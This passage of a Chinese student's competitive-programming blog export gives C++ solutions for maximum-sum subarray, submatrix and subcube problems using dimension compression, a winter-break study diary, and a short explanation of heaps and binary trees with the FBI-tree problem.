<h3 id="BFS代码："><a href="#BFS代码：" class="headerlink" title="BFS代码："></a>BFS代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(q,<span class="number">0</span>,<span class="keyword">sizeof</span>(q));</span><br><span class="line">    a[x][y]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> head,tail=<span class="number">1</span>;</span><br><span class="line">    q[tail][<span class="number">1</span>]=x;</span><br><span class="line">    q[tail][<span class="number">2</span>]=y;</span><br><span class="line">    <span class="keyword">for</span>(head=<span class="number">1</span>;head&lt;=tail;head++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> xx,yy;</span><br><span class="line">        xx=q[head][<span class="number">1</span>];</span><br><span class="line">        yy=q[head][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> tx,ty;</span><br><span class="line">            tx=xx+dx[i];</span><br><span class="line">            ty=yy+dy[i];</span><br><span class="line">            <span class="keyword">if</span>(a[tx][ty]!=<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                q[++tail][<span class="number">1</span>]=tx;</span><br><span class="line">                q[tail][<span class="number">2</span>]=ty;</span><br><span class="line">                a[tx][ty]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>DFS</tag>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title>压缩维度P1173+P1174+P1164</title>
    <url>/2017/05/19/982069d3ea27/</url>
    <content><![CDATA[<h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><blockquote>
<p>这几天做了几道特别神奇的题目，让我感受到了算法的真正高效！这几道题的思路就是使劲压，从三维压到二维，从二维到一维，一维再优化，然后就可以将算法的复杂度下降很多很多。具体看下面的题：</p>
</blockquote>
<h2 id="一维累加和"><a href="#一维累加和" class="headerlink" title="一维累加和"></a>一维累加和</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><blockquote>
<p>给定N个数，求这N(1 &lt;=N &lt;= 100,000) 个数的某个连续子序列的累加和，保证这个连续子序列的累加和最大。</p>
</blockquote>
<h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h3><blockquote>
<p>第一行：一个整数N。(1 &lt;=N &lt;= 100,000) 接下来N行，每行一个整数P_i(-1,000 &lt;= P_i &lt;= 1,000)。表示第i个数。</p>
</blockquote>
<h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><blockquote>
<p>一个整数，表示子序列的最大连续累加和。</p>
</blockquote>
<h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>这道题首先来说……</p>
<p>单纯的进行一个个枚举然后加到一起最后排序是绝对不行的，因为复杂度是<code>O(N*N*N)</code>，所以说，我们需要进行优化。</p>
<p>因为一个序列是要不停地加下去的，如果前面的序列是正的，那么加到后面<strong>肯定变大</strong>，而如果是负数，那么还<strong>不如不加</strong>。于是我们就可以计算累加和，如果前面的累加和是整数，继续加下去，并和maxx（用来记录最大值）比较。如果<strong>累加和是负数</strong>，清零，然后重新加。最后比较出来的maxx一定就是最大值！</p>
<p>然后<code>O(N)</code>解决！</p>
<h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">int</span> n,m,maxnum=<span class="number">-20000000</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> s=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">        s+=m;</span><br><span class="line">        <span class="keyword">if</span>(s&gt;maxnum) maxnum=s;</span><br><span class="line">        <span class="keyword">if</span>(s&lt;<span class="number">0</span>) s=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;maxnum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二维累加和-压缩要开始了"><a href="#二维累加和-压缩要开始了" class="headerlink" title="二维累加和(压缩要开始了)"></a>二维累加和<del>(压缩要开始了)</del></h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><blockquote>
<p>给定一个正整数n（ n&lt;=500），然后输入一个N*N矩阵。求矩阵中最大加权矩形，即矩阵的每一个元素都有一权值，权值定义在整数集上。从中找一矩形，矩形大小无限制，是其中包含的所有元素的和最大 。矩阵的每个元素属于[-1100,1100]</p>
</blockquote>
<h3 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h3><blockquote>
<p>第一行：n<br><br>接下来是n行n列的矩阵。</p>
</blockquote>
<h3 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h3><blockquote>
<p>一个整数，表示最大子矩阵的和。</p>
</blockquote>
<h3 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h3><p>这道题书上有两种优化方法，一种是压缩维度，另一种就是预处理答案然后用公式，但是后者要慢很多慢很多。</p>
<p>具体方法：</p>
<p>第一种方法就是首先预处理出每一个位置 <code>(x，y)</code> 到 <code>(1,1)</code> 这个矩阵的累加和，用 <code>a[i][j]=a[i-1][j]+a[i][j-1]-a[i-1][j-1]+ans</code> (其中ans表示当前 <code>a[i][j]</code> 所在位置的初始值)这个公式的意思可以自己理解。然后我们就用O(N)的复杂度就解决了构建问题。</p>
<p>然后我们只需要再次使用一个公式，就可以求出 <code>(x1,y1)</code> 到 <code>(x2,y2)</code> 这个矩阵的累加和：<code>num=a[x2][y2]-a[x1-1][y2-1]-a[x2][y1-1]+a[x1-1][y1-1]</code> 这个公式就可以很好的求出啦；</p>
<p>再次的，我们使用一个四重循环，枚举每一个可能的矩形，然后计算出累加和，在和maxx比较赋值，最后留下来的答案就是最大的了；</p>
<p>BUT 看题目，数据范围是500 ，四次方呢……62 500 000 000 超时……</p>
<p>好不容易写出来的代码结果不对，妈卖批……</p>
<p>但是还有第二种更快的方法，就需要压缩了，压缩就是将一个求二维的压缩为求一维的方法，首先同样需要预处理，预处理出来这个矩阵中，纵向相加的值，比如在这个预处理的矩阵中 <code>a[i][j]</code> 就代表着，在第 j 列，前 i 行的所有累加和。</p>
<p>那么构建的方法也很简单，<code>a[i][j]=a[i-1][j]+a[i][j]</code> ； 然后我们就可以用 i 坐标相减的方法求出在 j 列，两个 i 坐标之间所有数的累加和，你可能想问，这样也不是有多高效啊，但是看P1173中优化的方法，就知道这个用优先队列找最大连续累加和的效率有多恐怖了。这样，我们只需要用一个二重循环确定这个矩阵的 <code>x1 x2</code> 然后利用一个一维数组 <code>b[i]</code> 存下在确定 <code>x1 x2</code> 的这种情况下，第 i 列的累加和，一个或者多个 <code>b[i]</code> 就构建出来了矩阵。然后由于我们已经压缩成了多个一维，所以参看P1173的优化方法。</p>
<p><code>O(N*N*N)</code> 完美<strong>AC</strong>；</p>
<h3 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> n,ans,num=<span class="number">-200000</span>;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">501</span>][<span class="number">501</span>],b[<span class="number">501</span>][<span class="number">501</span>],c[<span class="number">501</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>||j==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                a[i][j]=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;a[i][j];</span><br><span class="line">            b[i][j]=b[i<span class="number">-1</span>][j]+a[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=n;k++)</span><br><span class="line">                c[k]=b[j][k]-b[i<span class="number">-1</span>][k];</span><br><span class="line">            ans=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=n;k++)</span><br><span class="line">            &#123;</span><br><span class="line">                ans=ans+c[k];</span><br><span class="line">                <span class="keyword">if</span>(ans&gt;num) num=ans;</span><br><span class="line">                <span class="keyword">if</span>(ans&lt;<span class="number">0</span>) ans=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;num;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="三维累加和"><a href="#三维累加和" class="headerlink" title="三维累加和"></a>三维累加和</h2><h3 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h3><blockquote>
<p>我们希望从一个m<em>n</em>h的三维矩阵中,找出一个三维子矩阵,这个子矩阵的权和最大其中对于全部的数据,1&lt;=h&lt;=32,1&lt;=m,n&lt;=50,保证h&lt;=m,n；</p>
</blockquote>
<h3 id="输入：-2"><a href="#输入：-2" class="headerlink" title="输入："></a>输入：</h3><blockquote>
<p>首行三个数h,m,n(注意顺序),分别表示立方体的高,长,宽.<br><br>以下h部分,每部分是一个m*n的矩阵,第i部分第j行的第k个数表示立方体第i层,第j行第k列的那块1立方厘米的小正方体的权。</p>
</blockquote>
<h3 id="输出"><a href="#输出" class="headerlink" title="输出:"></a>输出:</h3><blockquote>
<p>最大立方体累加和；</p>
</blockquote>
<h3 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h3><p>这道题，如果你天真的认为，数据范围不过50多，使劲搞，那真是超时就能超死你了。为什么呢？ <code>O(h*h*h*m*m*m*n*n*n)</code> 大概也就相当于50的9次方吧 <code>2*10^15</code> 超时妥妥的。</p>
<p>但是，我们可以压缩，这道题的思路就是首先将三位压缩为一个一个二维，将二维分别压缩为一维，然后用优先队列的方法求出最大值。思路很简单，看到前两道题应该就能想出来，就是用一个二重循环枚举立方体的h的范围，然后将你所枚举的立方体进行累加和压缩，压缩成一个矩阵，压缩为矩阵之后就像上一道题的方法一样进行计算就好了。</p>
<p>但是刚开始有些绕，所以说建议将图画出来，模拟一下这个压缩的过程，压缩成矩阵后千万不要相信书上的方法，一定要将矩阵再次压缩成线性，不然还是超时，不要问我为什么，我是有亲身经历的。</p>
<p>不过压缩的时候方向也是有讲究的，题目中给出h要比n和m小，所以说我们可以换一个方向压缩，这样就可以优化成 <code>O(h*h*n*m*m)</code> ，这里的换个方向有可能就会在比赛中决定最后一两个数据的AC与否，所以说，能优化的一定要优化。</p>
<h3 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>][<span class="number">100</span>][<span class="number">100</span>],b[<span class="number">100</span>][<span class="number">100</span>][<span class="number">100</span>],c[<span class="number">100</span>][<span class="number">100</span>],d[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> maxx=<span class="number">-20000</span>,ans,all;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">memset</span>(c,<span class="number">0</span>,<span class="keyword">sizeof</span>(c));</span><br><span class="line">    <span class="keyword">int</span> h,m,n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;h&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=h;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=m;j++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;=n;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">0</span>||j==<span class="number">0</span>||k==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            a[i][j][k]=<span class="number">0</span>;</span><br><span class="line">            b[i][j][k]=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i][j][k];</span><br><span class="line">        a[i][j][k]+=a[i<span class="number">-1</span>][j][k];</span><br><span class="line">        b[i][j][k]=a[i][j][k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=h;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=n;k++)</span><br><span class="line">    b[i][j][k]=b[i][j][k]+b[i][j][k<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=h;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=h;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=m;k++)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> o=<span class="number">1</span>;o&lt;=n;o++)</span><br><span class="line">        &#123;</span><br><span class="line">		    c[k][o]=a[j][k][o]-a[i<span class="number">-1</span>][k][o];</span><br><span class="line">            c[k][o]+=c[k][o<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=n;k++)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> o=k;o&lt;=n;o++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">1</span>;x&lt;=m;x++)</span><br><span class="line">            d[x]=c[x][o]-c[x][k<span class="number">-1</span>];</span><br><span class="line">            ans=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">1</span>;x&lt;=m;x++)</span><br><span class="line">            &#123;</span><br><span class="line">                ans+=d[x];</span><br><span class="line">                <span class="keyword">if</span>(ans&gt;maxx) maxx=ans;</span><br><span class="line">                <span class="keyword">if</span>(ans&lt;<span class="number">0</span>) ans=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;maxx&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>压缩维度</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假满血复活</title>
    <url>/2017/05/19/a7ed78662238/</url>
    <content><![CDATA[<h1 id="寒假安排："><a href="#寒假安排：" class="headerlink" title="寒假安排："></a>寒假安排：</h1><blockquote>
<p>1.写完第二页的所有题目（约40题）<br><br>2.学完搜索……<br><br>3.写出来素数方阵。<br><br>4.写出来虫食算。<br><br>5.补一补以前留下来的坑（比如高精度）</p>
</blockquote>
<h2 id="每日过程："><a href="#每日过程：" class="headerlink" title="每日过程："></a>每日过程：</h2><h3 id="Jan-13"><a href="#Jan-13" class="headerlink" title="Jan/13"></a>Jan/13</h3><p>今天下午去机房晚了一点，写了寒假安排（可能会调整），然后写了P1162是一道比较水的搜索题，枚举过了。表示对寒假很期待。</p>
<h3 id="Jan-14"><a href="#Jan-14" class="headerlink" title="Jan/14"></a>Jan/14</h3><p>今天上午写了等差数列，听老师和学姐讲了一些东西，下午有些难受，就先走了。</p>
<h3 id="Jan-15"><a href="#Jan-15" class="headerlink" title="Jan/15"></a>Jan/15</h3><p>上午开了USACO的铜组，A掉了三道题，但是第三题题意很难理解，可能是翻译的问题吧，get两个银组小号，晚上没有来机房，数学老师自习课占用了。</p>
<h3 id="Jan-16"><a href="#Jan-16" class="headerlink" title="Jan/16"></a>Jan/16</h3><p>感受到了银组的难度但是，我还是写出了第一题，然后发现，第一题最后一组超时……<br>下午翘课来机房，然后写了第二题，写了搜索的两道题，学到了状态压缩P1173和P1174，算法效率很高，但是P1174不是太懂，因为要改USACO银组，就丢给明天了。于是我把枚举换成二分，AC.</p>
<h3 id="Jan-17"><a href="#Jan-17" class="headerlink" title="Jan/17"></a>Jan/17</h3><p>早上三节课来机房，写了USACO银组第二题，略简单，需要空间换时间，入门篇里面的。下午到机房写了补了P1174的题，自己完全弄懂之后才A掉，真是不能相信书上的代码。然后一下午都在想立方体求和，结果超时……</p>
<h3 id="Jan-18"><a href="#Jan-18" class="headerlink" title="Jan/18"></a>Jan/18</h3><p>下午去嗨，所以上午没有回家写了立方体求和P1164，比较了两种算法，写了关于在求最大累加和的三个维度的压缩，日志传送门：<a href="https://xorex.space/2017/05/19/982069d3ea27/">压缩维度</a></p>
<h3 id="Jan-19"><a href="#Jan-19" class="headerlink" title="Jan/19"></a>Jan/19</h3><p>补完关于累加和的博客3000多字的样子，下午去看英语补习班，同学过生日，好乱。</p>
<h3 id="Jan-20"><a href="#Jan-20" class="headerlink" title="Jan/20"></a>Jan/20</h3><p>上午没来，下午写了P1167细胞问题，只写出来了DFS写法，BFS虽然理解了并写出来了，但是还需要debug……日志传送门:<a href="https://xorex.space/2017/05/19/bd911b6aa105">DFS&amp;DFS</a></p>
<p>今天早上写了P1167的BFS写法，并成功debug，然后补完了上面的日志。下午是P1168和P1171，debug了好久好久，感觉我学了假递归。</p>
<h3 id="Jan-21"><a href="#Jan-21" class="headerlink" title="Jan/21"></a>Jan/21</h3><p>今天上午搞了模拟赛，暴力拿第三……还学到了flag不能乱立的说。下午写了P1179 八皇后问题，练练搜索……</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>刷题柱</tag>
        <tag>规划</tag>
      </tags>
  </entry>
  <entry>
    <title>堆+优先队列+完全二叉树+P1235 FBI树</title>
    <url>/2017/05/19/81430cbb9fac/</url>
    <content><![CDATA[<h2 id="堆-优先队列"><a href="#堆-优先队列" class="headerlink" title="堆/优先队列"></a>堆/优先队列</h2><blockquote>
<p>我觉得堆和优先队列是我现在学习到的最神奇的东西了，比sort还要神奇！</p>
</blockquote>
<p>堆和优先队列是比较高级的数据结构，效率很高，<code>O(logn)</code>啊！堪比sort，但是实际上并没有sort快，但是也是很方便的。</p>
<p>然后就是使用的时候麻烦一点，需要输入一些<strong>不好记住</strong>的东西：</p>
<h3 id="堆的定义"><a href="#堆的定义" class="headerlink" title="堆的定义"></a>堆的定义</h3><p><code>priority_queue&lt;int,vector&lt;int&gt;,greater(less)&lt;int(double)&gt; &gt; ans(name);</code></p>
<p>然后就是头文件：<code>#include&lt;queue&gt;</code></p>
<h3 id="堆的使用"><a href="#堆的使用" class="headerlink" title="堆的使用"></a>堆的使用</h3><p>然后就可以随心所欲的<code>ans.push(a[i])</code>进队，返回队列是否为空<code>ans.empty()</code>，删除第一个元素<code>ans.pop()</code>，返回元素个数<code>ans.size()</code>，返回优先值最高的东西<code>ans.top()</code>。</p>
<p>这就是堆的一些应用，用堆的排序效率并不是太高，仅仅只是一些特别的题目会用到，然后就是完全二叉树了！</p>
<h2 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h2><p><img src="https://xorex.space/image/011.jpg"></p>
<p>上面的就是二叉树，分别是<del>好用</del>的满二叉树，<del>一边倒</del>的完全二叉树和<del>体型奇异</del>的非完全二叉树。</p>
<p>二叉树直接存储的时候，按照左儿子是自己坐标乘2，右儿子是乘2+1 。</p>
<p>就这样乘就可以用一个结构体，将一个二叉树存储下来！</p>
<p><del>下面直接看题目：</del></p>
<h2 id="P1235-FBI树"><a href="#P1235-FBI树" class="headerlink" title="P1235-FBI树"></a>P1235-FBI树</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><blockquote>
<p>我们可以把由“0”和“1”组成的字符串分为三类：全“0”串称为B串，全“1”串称为I串，既含“0”又含“1”的串则称为F串。 FBI树是一种二叉树[1]，它的结点类型也包括F结点，B结点和I结点三种。由一个长度为2N的“01”串S可以构造出一棵FBI树T，递归的构造方法如下： 1) T的根结点为R，其类型与串S的类型相同； 2) 若串S的长度大于1，将串S从中间分开，分为等长的左右子串S1和S2；由左子串S1构造R的左子树T1，由右子串S2构造R的右子树T2。 现在给定一个长度为2N的“01”串，请用上述构造方法构造出一棵FBI树，并输出它的后序遍历[2]序列。</p>
</blockquote>
<blockquote>
<p><img src="https://xorex.space/image/012.jpg"></p>
</blockquote>
<h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h3><blockquote>
<p>第一行是一个整数N（0 ≤ N ≤ 10），第二行是一个长度为2^N的“01”串。</p>
</blockquote>
<h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><blockquote>
<p>一行，这一行只包含一个字符串，即FBI树的后序遍历序列。</p>
</blockquote>
<h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>这道题，我最开始是用的递归，然后循环比较有多少个0，多少个1什么的，然后发现写来写去，写的我一脸懵逼，写的我想<del>吐</del>。</p>
<p>于是乎，于是乎，我想起来了递推，我想起来了只需要比较左右孩子的F、B、I，的值就好了，一样的话就是和儿子们相同，不一样的话就一定是F，就这样递推过了，一定要记得<strong>逆推</strong>，先将二叉树的最后一层提前处理完毕，然后两个两个跑，两个比较一下，给爸爸一个明确的值，等到轮到爸爸和叔叔的时候，有会给爷爷一个值，然后不停比较，不停跑就好，一直跑到祖宗节点，一个<strong>后序遍历</strong>就好！</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FBI</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> leftchild;</span><br><span class="line">    <span class="keyword">int</span> rightchild;</span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">&#125;;</span><br><span class="line">FBI arr[<span class="number">20000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">out</span><span class="params">(<span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    out(arr[p].leftchild);</span><br><span class="line">    out(arr[p].rightchild);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;arr[p].s;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,all=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">string</span> s1;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;s1;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=s1.size();i&gt;=<span class="number">1</span>;i=i/<span class="number">2</span>)</span><br><span class="line">        all+=i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=all-s1.size()+<span class="number">1</span>;i&lt;=all;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arr[i].leftchild=<span class="number">0</span>;</span><br><span class="line">        arr[i].rightchild=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(s1[i+s1.size()-all<span class="number">-1</span>]==<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        arr[i].s=<span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(s1[i+s1.size()-all<span class="number">-1</span>]==<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        arr[i].s=<span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=all;i&gt;<span class="number">1</span>;i=i<span class="number">-2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i].s==arr[i<span class="number">-1</span>].s)</span><br><span class="line">            arr[i/<span class="number">2</span>].s=arr[i].s;</span><br><span class="line">        <span class="keyword">if</span>(arr[i].s!=arr[i<span class="number">-1</span>].s)</span><br><span class="line">            arr[i/<span class="number">2</span>].s=<span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=all-s1.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            arr[i].leftchild=i*<span class="number">2</span>;</span><br><span class="line">            arr[i].rightchild=i*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    out(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>总结</tag>
        <tag>树结构</tag>
      </tags>
  </entry>
  <entry>
    <title>栈和队列+P1148括号匹配加强版</title>
    <url>/2017/05/19/002f6a33abaa/</url>
